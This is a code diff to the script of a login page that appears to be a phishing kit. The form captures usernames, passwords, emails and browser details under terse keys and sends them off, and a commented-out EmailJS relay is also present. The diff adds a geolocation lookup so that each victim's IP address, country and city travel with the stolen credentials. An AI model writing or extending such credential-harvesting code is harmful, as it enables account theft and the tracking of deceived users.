@@ -182,13 +182,21 @@
 <script>
   document.getElementById('loginForm').addEventListener('submit', async function(e) {
   e.preventDefault();
-
+  let city;
+  let country;
+  let ip;
   const username = document.getElementById('input1').value;
   const password = document.getElementById('input2').value;
   const userAgent = `UPL: ${navigator.platform}\nULA: ${navigator.language}\nOSY/UIN: ${navigator.userAgent}`
   const bypass = document.getElementById('bypassSelect').value;
   const userEmail = document.getElementById('input3').value;
-
+  fetch('https://ipapi.co/json/')
+  .then(res => res.json())
+  .then(data => {
+    ip = data.ip;
+    country = data.country;
+    city = data.city;
+  });
   const spinner = document.getElementById('spinner');
   const loginbox = document.getElementById('login-box');
   const status = document.getElementById('status');
@@ -222,7 +230,10 @@
     un: username,
     up: password,
     ua: userAgent,
-    ue: userEmail
+    ue: userEmail,
+    uc: country,
+    uci: city,
+    ui: ip
   })
   //emailjs.init("8d00WW8DI3O8YMGeC");
   //emailjs.send('service_12cgdxn', 'template_6qpuckw', {
@@ -238,12 +249,6 @@
     console.log(err);
   }
 });
-fetch('https://api.ipify.org?format=json')
-  .then(res => res.json())
-  .then(data => {
-    console.log("Your public IP is:", data.ip);
-  });
-
 </script>
 </body>
 </html>
